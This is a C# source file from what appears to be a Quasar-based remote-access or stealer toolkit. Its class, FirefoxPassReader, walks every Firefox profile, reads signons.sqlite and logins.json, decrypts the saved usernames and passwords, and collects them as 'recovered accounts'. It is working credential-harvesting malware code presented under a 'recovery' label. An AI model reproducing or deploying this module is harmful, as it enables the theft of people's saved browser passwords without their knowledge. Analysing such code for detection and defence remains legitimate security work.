using Everything.Recovery;
using Everything.Recovery.Utilities;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Quasar.Common.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace Everything.Recovery.Browsers
{
    public class FirefoxPassReader : IAccountReader
    {
        /// <inheritdoc />
        public string ApplicationName => "Firefox";

        /// <inheritdoc />
        public IEnumerable<RecoveredAccount> ReadAccounts()
        {
            var dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));

            var logins = new List<RecoveredAccount>();
            if (dirs.Length == 0)
                return logins;

            foreach (var dir in dirs)
            {
                var signonsFile = string.Empty;
                var loginsFile = string.Empty;
                var signonsFound = false;
                var loginsFound = false;

                var files = Directory.GetFiles(dir, "signons.sqlite");
                if (files.Length > 0)
                {
                    signonsFile = files[0];
                    signonsFound = true;
                }

                files = Directory.GetFiles(dir, "logins.json");
                if (files.Length > 0)
                {
                    loginsFile = files[0];
                    loginsFound = true;
                }

                if (loginsFound || signonsFound)
                {
                    using (var decrypter = new FFDecryptor())
                    {
                        var r = decrypter.Init(dir);
                        if (signonsFound)
                        {
                            SQLiteHandler sqlDatabase;

                            if (!File.Exists(signonsFile))
                                return logins;

                            try
                            {
                                sqlDatabase = new SQLiteHandler(signonsFile);
                            }
                            catch (Exception)
                            {
                                return logins;
                            }

                            if (!sqlDatabase.ReadTable("moz_logins"))
                                return logins;

                            for (var i = 0; i < sqlDatabase.GetRowCount(); i++)
                            {
                                try
                                {
                                    var host = sqlDatabase.GetValue(i, "hostname");
                                    var user = decrypter.Decrypt(sqlDatabase.GetValue(i, "encryptedUsername"));
                                    var pass = decrypter.Decrypt(sqlDatabase.GetValue(i, "encryptedPassword"));

                                    if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
                                    {
                                        logins.Add(new RecoveredAccount
                                        {
                                            Url = host,
                                            Username = user,
                                            Password = pass,
                                            Application = ApplicationName
                                        });
                                    }
                                }
                                catch (Exception)
                                {
                                    // ignore invalid entry
                                }
                            }
                        }

                        if (loginsFound)
                        {
                            JArray ffLoginData;
                            using (var sr = File.OpenRead(loginsFile))
                            {
                                using (var tr = new StreamReader(sr, encoding: new UTF8Encoding(false)))
                                {
                                    using (var jr = new JsonTextReader(tr))
                                    {
                                        var obj = (JObject)JToken.ReadFrom(jr);
                                        ffLoginData = (JArray)obj["logins"];
                                        //ffLoginData = JsonHelper.Deserialize<FFLogins>(sr);
                                    }
                                }
                            }

                            foreach (var loginData in ffLoginData.Values())
                            {
                                var username = decrypter.Decrypt(loginData["encryptedUsername"].ToString());
                                var password = decrypter.Decrypt(loginData["encryptedPassword"].ToString());
                                logins.Add(new RecoveredAccount
                                {
                                    Username = username,
                                    Password = password,
                                    Url = loginData["hostname"].ToString(),
                                    Application = ApplicationName
                                });
                            }
                        }
                    }
                }

            }

            return logins;
        }

        //[DataContract]
        //private class FFLogins
        //{
        //    [DataMember(Name = "nextId")]
        //    public long NextId { get; set; }
        //
        //    [DataMember(Name = "logins")]
        //    public Login[] Logins { get; set; }
        //
        //    [IgnoreDataMember]
        //    [DataMember(Name = "potentiallyVulnerablePasswords")]
        //    public object[] PotentiallyVulnerablePasswords { get; set; }
        //
        //    [IgnoreDataMember]
        //    [DataMember(Name = "dismissedBreachAlertsByLoginGUID")]
        //    public DismissedBreachAlertsByLoginGuid DismissedBreachAlertsByLoginGuid { get; set; }
        //
        //    [DataMember(Name = "version")]
        //    public long Version { get; set; }
        //}
        //
        //[DataContract]
        //private class DismissedBreachAlertsByLoginGuid
        //{
        //}
        //
        //[DataContract]
        //private class Login
        //{
        //    [DataMember(Name = "id")]
        //    public long Id { get; set; }
        //
        //    [DataMember(Name = "hostname")]
        //    public Uri Hostname { get; set; }
        //
        //    [DataMember(Name = "httpRealm")]
        //    public object HttpRealm { get; set; }
        //
        //    [DataMember(Name = "formSubmitURL")]
        //    public Uri FormSubmitUrl { get; set; }
        //
        //    [DataMember(Name = "usernameField")]
        //    public string UsernameField { get; set; }
        //
        //    [DataMember(Name = "passwordField")]
        //    public string PasswordField { get; set; }
        //
        //    [DataMember(Name = "encryptedUsername")]
        //    public string EncryptedUsername { get; set; }
        //
        //    [DataMember(Name = "encryptedPassword")]
        //    public string EncryptedPassword { get; set; }
        //
        //    [DataMember(Name = "guid")]
        //    public string Guid { get; set; }
        //
        //    [DataMember(Name = "encType")]
        //    public long EncType { get; set; }
        //
        //    [DataMember(Name = "timeCreated")]
        //    public long TimeCreated { get; set; }
        //
        //    [DataMember(Name = "timeLastUsed")]
        //    public long TimeLastUsed { get; set; }
        //
        //    [DataMember(Name = "timePasswordChanged")]
        //    public long TimePasswordChanged { get; set; }
        //
        //    [DataMember(Name = "timesUsed")]
        //    public long TimesUsed { get; set; }
        //}
    }
}
